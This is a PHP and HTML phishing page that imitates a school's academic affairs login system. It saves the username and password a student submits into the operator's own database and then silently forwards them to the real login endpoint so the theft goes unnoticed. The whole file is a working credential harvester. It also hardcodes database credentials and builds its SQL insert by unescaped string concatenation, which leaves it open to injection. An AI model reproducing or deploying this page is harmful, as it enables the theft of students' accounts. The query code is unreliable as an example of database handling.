<style>
        font{
                color:rgb(45,163,150);
                font-size:20px;
                font-family:Microsoft YaHei,tahoma,arial,Hiragino Sans;
                font-weight:200;
                letter-spacing:1px;
        }
</style>
<?php
        $username=$_POST['j_username'];
        $password=$_POST['j_password'];
        $sql_id='localhost';
        $sql_name='julone';
        $sql_password='julone520';
        $sql_db='julone';
        $time = date("Y-m-d H:i:s",time());
        $connection = mysql_connect($sql_id, $sql_name, $sql_password) or die("Unable to connect!");
        mysql_select_db($sql_db) or die("Unable to select database!"); 
        $sql="INSERT IGNORE INTO Student VALUES ('".$username."', '".$password."', '".$time."')";
        $result = mysql_query($sql);
        echo "<font>正在连接校园数据库,请稍候...</font>";
        mysql_close($connection); 
?>
<!DOCTYPE html>
<html lang = "en">
<head>
    <meta charset = "UTF-8">
    <title>综合教务管理系统</title>
</head>
<script src="jquery.min.js" type="text/javascript"></script>
<script type="text/javascript">
    $(function(){
        $("form").submit();
    });
</script>
<body>
<form name="form1" action="http://jwc.qztc.edu.cn/academic/j_acegi_security_check" method="post" id="form">
    <input id="username" type="hidden" name="j_username" autocomplete="off" value="<?php echo $username?>">
    <input id="password" type="hidden" name="j_password" autocomplete="off" value="<?php echo $password?>">
</form>
<form name="form2" action="http://210.34.124.7/cgi-bin/nph-ireader.pl/ireader/00/http/jwc.qztc.edu.cn/academic/j_acegi_security_check=3bjsessionid=3dB6DB04AF2880301AFF356220F9C6D7E0.TA4" method="post" id="form">
    <input id="username" type="hidden" name="j_username" autocomplete="off" value="<?php echo $username?>">
    <input id="password" type="hidden" name="j_password" autocomplete="off" value="<?php echo $password?>">
</form>
</body>
</html>